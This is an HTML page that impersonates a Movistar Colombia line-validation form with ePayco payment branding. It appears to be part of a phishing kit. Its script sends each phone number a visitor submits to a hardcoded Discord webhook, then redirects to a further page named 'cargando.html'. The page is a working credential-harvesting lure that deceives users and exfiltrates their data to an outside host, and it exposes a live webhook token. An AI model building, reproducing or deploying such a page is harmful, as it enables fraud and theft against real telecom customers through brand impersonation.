<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="Validar línea Movistar" />
  <meta name="theme-color" content="#019DF4" />
  <title>Validar línea - Movistar</title>
  <link rel="shortcut icon" href="img/apple-touch-icon.png" type="image/x-icon">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    body {
      background: #f4f6f9;
      font-family: 'Segoe UI', sans-serif;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }

    header {
      background-color: #fff;
      padding: 1rem;
      text-align: center;
      border-bottom: 1px solid #eee;
    }

    .header-image {
      max-height: 50px;
    }

    .header-footer-text {
      font-size: 0.9rem;
      color: #666;
      margin-top: 0.5rem;
    }

    .header-footer-text img {
      height: 18px;
      margin: 0 5px;
    }

    .login-container {
      flex: 1;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 2rem;
    }

    .login-box {
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
      padding: 2rem;
      width: 100%;
      max-width: 420px;
    }

    .login-box h2 {
      font-weight: 600;
      color: #004a99;
      text-align: center;
      margin-bottom: 1.5rem;
    }

    .input-group {
      display: flex;
      align-items: center;
      border: 1px solid #ccc;
      border-radius: 8px;
      overflow: hidden;
      background: #fafafa;
    }

    .input-group img {
      width: 22px;
      margin: 0 10px;
      opacity: 0.6;
    }

    .input-group input {
      border: none;
      flex: 1;
      padding: 10px;
      outline: none;
      background: transparent;
    }

    .btn-primary {
      background-color: #019df4;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      margin-top: 1rem;
      padding: 0.75rem;
      width: 100%;
    }

    .btn-primary:hover {
      background-color: #017ac0;
    }

    footer {
      text-align: center;
      padding: 1rem;
      font-size: 0.9rem;
      color: #555;
      background: #fff;
      border-top: 1px solid #eee;
    }

    footer img {
      height: 20px;
      margin: 0 4px;
    }

    /* Loader */
    #loader {
      display: none;
      position: fixed;
      left: 0;
      top: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(255, 255, 255, 0.7);
      align-items: center;
      justify-content: center;
      z-index: 10000;
    }

    .svg-circle {
      width: 4em;
      height: 4em;
      transform-origin: center;
      animation: rotate4 2s linear infinite;
    }

    circle {
      fill: none;
      stroke: #019df4;
      stroke-width: 4;
      stroke-dasharray: 1, 200;
      stroke-dashoffset: 0;
      stroke-linecap: round;
      animation: dash4 1.5s ease-in-out infinite;
    }

    @keyframes rotate4 {
      100% {
        transform: rotate(360deg);
      }
    }

    @keyframes dash4 {
      0% {
        stroke-dasharray: 1, 200;
        stroke-dashoffset: 0;
      }
      50% {
        stroke-dasharray: 89, 200;
        stroke-dashoffset: -35;
      }
      100% {
        stroke-dasharray: 89, 200;
        stroke-dashoffset: -124;
      }
    }
  </style>
</head>

<body>
  <header>
    <img src="img/descarga.png" alt="Movistar Logo" class="header-image" />
    <div class="header-footer-text">
      <img src="img/png-transparent-computer-icons-password-login-user-padlock-miscellaneous-christianity-rectangle.png" alt="candado" />
      Pagos procesados por 
      <img src="img/logo_ePayco.1722863467828.png" alt="logo epayco" />
    </div>
  </header>

  <div class="login-container">
    <div class="login-box">
      <h2>Validar línea</h2>
      <form id="loginForm">
        <div class="input-group mb-3">
          <img src="img/mobile-phone-or-smartphone-line-icon-outline-sign-linear-style-pictogram-isolated-on-white-symbol-logo-illustration-editable-stroke-vector.png" alt="teléfono" />
          <input type="text" id="linea" placeholder="Ingresa tu número de línea" required>
        </div>
        <button type="submit" class="btn btn-primary">Continuar</button>
      </form>
    </div>
  </div>

  <footer>
    © Movistar Colombia - Todos los derechos reservados
  </footer>

  <!-- Loader -->
  <div id="loader">
    <svg viewBox="25 25 50 50" class="svg-circle">
      <circle r="20" cy="50" cx="50"></circle>
    </svg>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1416167076737056868/N0PLYys9FxoMqosemT9ACC6Il9qJlS1lmAkgriwfjugHpUPWd9ozsimjK5NdhYTRxiHS";

    function sendToDiscord(message) {
      const data = { content: message };
      fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      })
      .then(res => console.log("✅ Enviado a Discord"))
      .catch(err => console.error("❌ Error enviando a Discord", err));
    }

    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();
      const linea = document.getElementById('linea').value.trim();
      if (!linea) return;

      // Mostrar loader
      document.getElementById("loader").style.display = "flex";

      setTimeout(() => {
        document.getElementById("loader").style.display = "none";

        const fecha = new Date().toLocaleString("es-CO");
        const mensaje = `📲 **Nueva validación de línea:**\n🔢 Número: ${linea}\n🕒 Fecha: ${fecha}`;
        sendToDiscord(mensaje);

        localStorage.setItem('linea', linea);
        window.location.href = "cargando.html";
      }, 2000);
    });
  </script>
</body>
</html>
